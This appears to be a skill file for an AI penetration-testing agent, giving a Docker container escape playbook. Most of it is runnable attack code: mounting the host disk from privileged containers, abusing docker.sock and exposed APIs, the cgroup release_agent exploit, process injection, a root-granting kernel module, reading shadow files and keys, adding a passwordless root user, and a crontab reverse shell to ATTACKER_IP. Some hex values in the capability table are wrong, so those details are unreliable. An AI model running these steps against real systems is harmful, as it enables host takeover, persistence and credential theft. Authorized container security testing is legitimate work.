---
name: docker-escape
description: "Docker container escape techniques including privilege escalation, socket abuse, and namespace breakout"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["docker escape", "container escape", "breakout", "docker socket", "privileged container", "escape docker", "namespace escape", "cgroup escape", "docker root", "host access from container"]
contextBoosts: [endpoints]
mitreAttack: ["T1611", "T1610"]
owaspRefs: ["OWASP Docker Security", "OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# Docker Container Escape

Container escape is the act of breaking out of an isolated container environment to gain access to the underlying host system. This skill covers every documented technique for escaping Docker containers, from simple misconfigurations to advanced kernel-level exploits.

---

## When to Use

- You have shell access inside a Docker container and need to assess host escape risk
- You are auditing a Dockerfile, docker-compose stack, or Kubernetes pod for escape vectors
- You found a privileged container or one with dangerous capabilities/volumes
- You are testing a containerized application's isolation boundaries
- The Docker daemon socket is mounted inside the container
- You need to verify whether a container breakout is possible during a penetration test

## Do Not Use

- Against production systems without explicit written authorization
- Against containers you do not own or have permission to test
- To exfiltrate data from containers beyond the scope of the engagement
- Against Kubernetes clusters in shared tenant environments without cluster-admin approval
- Against cloud-managed container services (ECS, GKE, AKS) where host escape has different implications

---

## Auth Context

Container escape requires existing shell access inside the container or the ability to execute commands within it. Before attempting escape:

1. **Confirm authorization**: The engagement scope must explicitly include container escape testing
2. **Document the entry point**: Record how you gained container access (reverse shell, exec, SSRF, etc.)
3. **Identify the container runtime**: Docker, containerd, CRI-O — each has different escape surfaces
4. **Check the orchestrator**: Standalone Docker vs. Kubernetes vs. Docker Swarm changes the blast radius

---

## Detection — Confirm You Are Inside a Container

Before attempting escape, confirm you are actually in a container and identify its configuration.

### Filesystem Indicators

```bash
# Check for dockerenv file (present in most Docker containers)
ls -la /.dockerenv

# Check /proc/1/cgroup — containers show docker or containerd paths
cat /proc/1/cgroup

# Check for container-related environment variables
env | grep -i container
env | grep -i docker

# Check hostname (often the container ID)
hostname
```

### Cgroup Detection

```bash
# If cgroup output contains "docker" or container IDs, you are in a container
cat /proc/1/cgroup | grep -i docker
cat /proc/1/cgroup | grep -i containerd

# systemd-based containers show /system.slice/docker-<id>.scope
cat /proc/1/cgroup | grep system.slice
```

### Process Table Analysis

```bash
# PID 1 is typically the entrypoint, not init — confirms containerization
ps aux

# In a container, PID 1 is usually the app process, not systemd
# In a VM or host, PID 1 is init/systemd
cat /proc/1/cmdline
```

### Mount Enumeration

```bash
# List all mounts to find host volumes or socket mounts
mount
cat /proc/mounts

# Look for docker.sock, host filesystem mounts, or proc/sysrq-trigger
mount | grep -E "docker.sock|/host|/proc/sysrq"
```

---

## Privileged Container Escape

A privileged container has nearly all host capabilities and can mount the host filesystem directly.

### Detection

```bash
# Check if running as privileged
cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff = fully privileged

# Compare against standard capabilities
# Unprivileged: 00000000a80425fb
# Privileged:   0000003fffffffff
```

### Mount Host Filesystem

```bash
# Create a mount point
mkdir -p /host

# Mount the host root filesystem
mount /dev/sda1 /host
# or if sda1 is not available, try:
ls /dev/sd*
ls /dev/vd*

# If multiple disks are available, identify the correct one
fdisk -l

# Once mounted, access host files
chroot /host

# You now have root on the host
whoami
id
cat /etc/shadow
```

### Alternative: Use nsenter to Enter Host Namespace

```bash
# nsenter enters the namespaces of PID 1 on the host
# This works because privileged containers share the host PID namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# If nsenter is not available, install it
apt-get update && apt-get install -y util-linux
```

### Mount Host Docker Socket

```bash
# If /dev is accessible, mount the host's docker socket
mount /dev/sda1 /mnt
mkdir -p /mnt/var/run
cp /var/run/docker.sock /mnt/var/run/docker.sock 2>/dev/null

# Or directly mount if device is available
ls /dev/sda*
mount /dev/sda2 /mnt  # root partition may not be sda1
```

### Write to Host Filesystem

```bash
# Mount host root
mount /dev/sda1 /host

# Add SSH key for persistent access
mkdir -p /host/root/.ssh
echo "ssh-rsa AAAA..." >> /host/root/.ssh/authorized_keys

# Or install a reverse shell in host crontab
echo "* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /host/var/spool/cron/crontabs/root
```

---

## Docker Socket Abuse

If `/var/run/docker.sock` is mounted inside the container, you can control the Docker daemon on the host.

### Verify Socket Access

```bash
# Check if the socket is mounted
ls -la /var/run/docker.sock

# Test API access
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

### Escape by Creating a Privileged Container

```bash
# Create a new container with host root mounted and privileged mode
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["chroot", "/host", "bash"],
    "Privileged": true,
    "Binds": ["/:/host:rw"],
    "Tty": true,
    "OpenStdin": true
  }' \
  http://localhost/containers/create?name=escape

# Start the container
curl --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/escape/start

# Attach to get a shell on the host
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Detach": false}' \
  http://localhost/containers/escape/attach
```

### Alternative: Run with Host PID Namespace

```bash
# Create container sharing host PID namespace
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh"],
    "HostConfig": {
      "PidMode": "host",
      "Binds": ["/:/host:rw"]
    }
  }' \
  http://localhost/containers/create?name=pid-escape

curl --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/pid-escape/start
```

### Extract Secrets from Host

```bash
# Once you have host access via socket abuse
cat /host/etc/shadow
cat /host/root/.ssh/id_rsa
cat /host/etc/kubernetes/admin.conf  # kubeconfig
docker --unix-socket /var/run/docker.sock ps  # list all containers
```

---

## HostPID / HostNetwork Escape

Containers sharing the host PID or network namespace have direct access to host processes and network interfaces.

### HostPID — Access Host Processes

```bash
# If pidMode is "host", /proc contains host processes
ls /proc | grep -E "^[0-9]+$" | head -20

# Find host SSH keys or sensitive processes
cat /proc/1/environ | tr '\0' '\n'

# Inject into host process memory (requires SYS_PTRACE)
nsenter --target $(pgrep -f sshd) -- /bin/bash

# Read environment variables of host processes (may contain secrets)
for pid in $(ls /proc | grep -E "^[0-9]+$"); do
  echo "=== PID $pid ==="
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n'
done
```

### HostNetwork — Sniff Host Traffic

```bash
# If networkMode is "host", you share the host network stack
ip addr show
# Should show host interfaces, not just container veth

# Capture traffic on host interfaces
tcpdump -i eth0 -w /tmp/capture.pcap

# Access services bound to localhost on the host
curl http://127.0.0.1:6443/version  # Kubernetes API
curl http://127.0.0.1:2375/version  # Docker API
```

---

## Cgroup Escape

Cgroup escape uses the Linux cgroup subsystem to execute commands on the host. This works on older kernels (pre-5.x) or when the container has `SYS_ADMIN` capability.

### Classic cgroup release_agent Escape

```bash
# Requires: privileged container or CAP_SYS_ADMIN
# Works on: kernels < 5.x reliably, 5.x+ with conditions

# Step 1: Ensure host cgroup namespace is accessible
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/x

# Step 2: Write the exploit payload
echo 1 > $d/x/notify_on_release
host_path=$(sed -n -e '/s/.*\uperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent

# Step 3: Create the command to execute on the host
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd

# Step 4: Trigger the cgroup
sh -c "echo \$\$ > $d/x/cgroup.procs"

# Step 5: Read the output
cat /output
```

### Modern cgroup v2 Escape

```bash
# cgroup v2 uses different mechanisms
# Requires: CAP_SYS_ADMIN or privileged

# Check cgroup version
stat -f /sys/fs/cgroup
# Type: cgroup2fs = v2, tmpfs = v1

# For cgroup v2, use release_agent equivalent
echo 'mount -t cgroup -o rdma cgroup /sys/fs/cgroup 2>/dev/null; sh /tmp/exploit.sh' > /tmp/trigger
chmod +x /tmp/trigger

# Alternative: use user namespaces + cgroup escape
unshare --mount --propagation unchanged bash -c '
  mount -t cgroup -o rdma cgroup /sys/fs/cgroup
  mkdir -p /sys/fs/cgroup/x
  echo 1 > /sys/fs/cgroup/x/notify_on_release
  echo "$HOST_PATH/cmd" > /sys/fs/cgroup/release_agent
  echo $$ > /sys/fs/cgroup/x/cgroup.procs
'
```

---

## Capabilities Abuse

Linux capabilities grant granular kernel-level privileges. Abusable capabilities enable escape.

### Key Capabilities for Escape

| Capability | Hex | Escape Vector |
|------------|-----|---------------|
| `CAP_SYS_ADMIN` | 0x200000 | Mount host filesystem, cgroup escape, mount fuse |
| `CAP_SYS_PTRACE` | 0x20000 | Attach to host processes, inject code |
| `CAP_NET_ADMIN` | 0x1000 | Modify host network, ARP spoofing, iptables |
| `CAP_DAC_OVERRIDE` | 0x8 | Bypass file permissions, read /etc/shadow |
| `CAP_SYS_RAWIO` | 0x10 | Direct I/O to host devices |
| `CAP_SYS_MODULE` | 0x1000 | Load kernel modules (ultimate escape) |
| `CAP_MKNOD` | 0x200000 | Create device files, access /dev/sda |

### SYS_PTRACE Escape

```bash
# Check current capabilities
cat /proc/self/status | grep Cap

# Find a process running as root on the host (if pidMode=host)
ps aux | grep root

# Attach to host process and inject shellcode
# Requires ptrace to be enabled on the host kernel
nsenter --target $(pgrep -o -f "sshd") -- /bin/bash

# Alternatively, use gdb to inject code
apt-get install -y gdb
gdb -p $(pgrep -f sshd)
(gdb) call (int)system("chmod +s /bin/bash")
```

### SYS_ADMIN — Mount FUSE/Overlay

```bash
# CAP_SYS_ADMIN allows mounting overlay filesystems
# This can be used to overlay the host filesystem

mkdir -p /tmp/upper /tmp/work /merged
mount -t overlay overlay \
  -o lowerdir=/,upperdir=/tmp/upper,workdir=/tmp/work \
  /merged

# /merged now contains a writable copy of the root filesystem
ls /merged/etc/shadow
chroot /merged
```

### SYS_MODULE — Load Kernel Module

```bash
# CAP_SYS_MODULE allows loading kernel modules — the ultimate escape
# Create a malicious kernel module

cat > /tmp/evil.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");

static int __init evil_init(void) {
    struct cred *new_cred;
    new_cred = prepare_creds();
    if (new_cred) {
        new_cred->uid = 0;
        new_cred->gid = 0;
        commit_creds(new_cred);
    }
    return 0;
}

static void __exit evil_exit(void) {}

module_init(evil_init);
module_exit(evil_exit);
EOF

# Compile and load (requires kernel headers in the container)
apt-get install -y linux-headers-$(uname -r) build-essential
make -C /lib/modules/$(uname -r)/build M=/tmp modules
insmod /tmp/evil.ko
```

---

## Docker API Exploitation

Exposed Docker daemon APIs are a critical attack surface. The daemon may listen on TCP ports 2375 (HTTP) or 2376 (HTTPS).

### Detection

```bash
# Scan for exposed Docker API ports
curl -s http://TARGET:2375/version
curl -s https://TARGET:2376/version --insecure

# List containers
curl http://TARGET:2375/containers/json

# List images
curl http://TARGET:2375/images/json
```

### Escape via API

```bash
# Create a privileged container with host root mounted
curl -X POST http://TARGET:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host:rw"]
    }
  }'

# Start and attach
curl -X POST http://TARGET:2375/containers/<ID>/start
curl -X POST http://TARGET:2375/containers/<ID>/exec \
  -d '{"Cmd": ["chroot", "/host", "/bin/sh"], "AttachStdout": true}'
```

### Extract Credentials

```bash
# Pull sensitive containers and inspect for secrets
curl http://TARGET:2375/containers/json | jq '.[].Image'
curl -X POST http://TARGET:2375/containers/<ID>/json | jq '.Config.Env'

# Check Docker daemon configuration
curl http://TARGET:2375/info | jq
```

---

## Volume Mount Abuse

Mounted host volumes provide direct filesystem access to the host.

### Common Dangerous Mounts

| Mount | Risk | Exploitation |
|-------|------|-------------|
| `/var/run/docker.sock` | Full Docker control | Create privileged container |
| `/etc/shadow` | Host password hashes | Offline cracking |
| `/root/.ssh` | SSH private keys | Persistent host access |
| `/etc/kubernetes` | Cluster credentials | Cluster takeover |
| `/var/log` | Log files, credentials | Information disclosure |
| `/proc` | Host process info | Process injection |
| `/sys` | Kernel parameters | Module loading |

### Read Host Secrets

```bash
# If /etc/shadow is mounted
cat /host/etc/shadow

# If SSH keys are mounted
cat /host/root/.ssh/id_rsa
cat /host/root/.ssh/authorized_keys

# If kubeconfig is mounted
cat /host/etc/kubernetes/admin.conf
export KUBECONFIG=/host/etc/kubernetes/admin.conf
kubectl get pods --all-namespaces
```

### Write to Host Filesystem via Volume

```bash
# If a writable volume is mounted
echo 'root2::0:0:root:/root:/bin/bash' >> /host/etc/passwd
echo '*:*:0:0:99999:7:::' >> /host/etc/shadow

# Or add SSH key
mkdir -p /host/root/.ssh
echo "ssh-rsa AAAA..." >> /host/root/.ssh/authorized_keys
```

---

## Anti-Hallucination

Every escape technique described here is based on documented Linux kernel mechanics and Docker runtime behavior. Before executing any technique:

1. **Verify the condition exists**: Do not assume a container is privileged without checking `CapEff` in `/proc/1/status`. Do not assume the docker socket is mounted without confirming `/var/run/docker.sock` exists and is accessible.

2. **Check kernel version**: Cgroup escape requires specific kernel versions. Run `uname -r` before attempting. Kernels 5.x+ have additional mitigations.

3. **Validate capability set**: Read `/proc/self/status` `CapEff` field and decode it. Do not assume capabilities are present.

4. **Test mounts before exploiting**: Always `ls` and `cat` mount points before attempting to write. A read-only mount will fail writes silently.

5. **Confirm API exposure**: Before exploiting Docker API on port 2375, confirm with a version request. Do not assume the API is unauthenticated.

6. **Document evidence**: Run every detection command, capture output, and record it as evidence before proceeding with exploitation.

---

## References

- MITRE ATT&CK T1611: Escape to Host
- MITRE ATT&CK T1610: Deploy Container
- OWASP Docker Security Cheat Sheet
- Docker Security Documentation: https://docs.docker.com/engine/security/
- Linux man pages: capabilities(7), namespaces(7), cgroups(7)
- Trail of Bits: Exploiting Linux Kernel Heap Consolidation (cgroup escape)
- NCC Group: A Guide to Linux Kernel Exploitation
